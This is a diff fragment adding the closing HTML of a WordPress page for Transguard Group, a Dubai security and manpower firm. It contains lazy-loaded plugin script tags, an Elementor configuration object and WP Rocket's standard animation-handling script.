+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/contact-form-7/modules/recaptcha/index42f0.js?ver=5.6.3' id='wpcf7-recaptcha-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/elementor/assets/js/webpack.runtime.min991d.js?ver=3.11.2' id='elementor-webpack-runtime-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/elementor/assets/js/frontend-modules.min991d.js?ver=3.11.2' id='elementor-frontend-modules-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min05da.js?ver=4.0.2' id='elementor-waypoints-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-includes/js/jquery/ui/core.min0028.js?ver=1.13.1' id='jquery-ui-core-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/elementor/assets/lib/swiper/swiper.min48f5.js?ver=5.3.6' id='swiper-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/elementor/assets/lib/share-link/share-link.min991d.js?ver=3.11.2' id='share-link-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/elementor/assets/lib/dialog/dialog.mind227.js?ver=4.9.0' id='elementor-dialog-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' id='elementor-frontend-js-before'>
+    var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Extra","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Extra","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.11.2","is_static":false,"experimentalFeatures":{"landing-pages":true,"kit-elements-defaults":true},"urls":{"assets":"https:\/\/transguardgroup.com\/wp-content\/plugins\/elementor\/assets\/"},"swiperClass":"swiper-container","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":4772,"title":"Transguard%20Group%20-%20Security%20Technology%2C%20Manpower%20Supplier%20in%20Dubai%20UAE","excerpt":"TGKMS to provide its maintenance and servicing solutions to the leading supplier of Hospitality Solutions ","featuredImage":"https:\/\/transguardgroup.com\/wp-content\/uploads\/2022\/08\/TG-Website_Feature-Image-Template-445-x-325-px-20.png"}};
+</script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/elementor/assets/js/frontend.min991d.js?ver=3.11.2' id='elementor-frontend-js' defer></script>
+  <script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='wp-content/plugins/elementor/assets/js/preloaded-modules.min991d.js?ver=3.11.2' id='preloaded-modules-js' defer></script>
+  <script>
+    class RocketElementorAnimation {
+      constructor() {
+        this.deviceMode = document.createElement("span"), this.deviceMode.id = "elementor-device-mode", this.deviceMode.setAttribute("class", "elementor-screen-only"), document.body.appendChild(this.deviceMode)
+      }
+      _detectAnimations() {
+        let t = getComputedStyle(this.deviceMode, ":after").content.replace(/"/g, "");
+        this.animationSettingKeys = this._listAnimationSettingsKeys(t), document.querySelectorAll(".elementor-invisible[data-settings]").forEach(t => {
+          const e = t.getBoundingClientRect();
+          if (e.bottom >= 0 && e.top <= window.innerHeight) try {
+            this._animateElement(t)
+          } catch (t) {}
+        })
+      }
+      _animateElement(t) {
+        const e = JSON.parse(t.dataset.settings),
+          i = e._animation_delay || e.animation_delay || 0,
+          n = e[this.animationSettingKeys.find(t => e[t])];
+        if ("none" === n) return void t.classList.remove("elementor-invisible");
+        t.classList.remove(n), this.currentAnimation && t.classList.remove(this.currentAnimation), this.currentAnimation = n;
+        let s = setTimeout(() => {
+          t.classList.remove("elementor-invisible"), t.classList.add("animated", n), this._removeAnimationSettings(t, e)
+        }, i);
+        window.addEventListener("rocket-startLoading", function() {
+          clearTimeout(s)
+        })
+      }
+      _listAnimationSettingsKeys(t = "mobile") {
+        const e = [""];
+        switch (t) {
+          case "mobile":
+            e.unshift("_mobile");
+          case "tablet":
+            e.unshift("_tablet");
+          case "desktop":
+            e.unshift("_desktop")
+        }
+        const i = [];
+        return ["animation", "_animation"].forEach(t => {
+          e.forEach(e => {
+            i.push(t + e)
+          })
+        }), i
+      }
+      _removeAnimationSettings(t, e) {
+        this._listAnimationSettingsKeys().forEach(t => delete e[t]), t.dataset.settings = JSON.stringify(e)
+      }
+      static run() {
+        const t = new RocketElementorAnimation;
+        requestAnimationFrame(t._detectAnimations.bind(t))
+      }
+    }
+    document.addEventListener("DOMContentLoaded", RocketElementorAnimation.run);
+  </script>
+</body>
+</html>
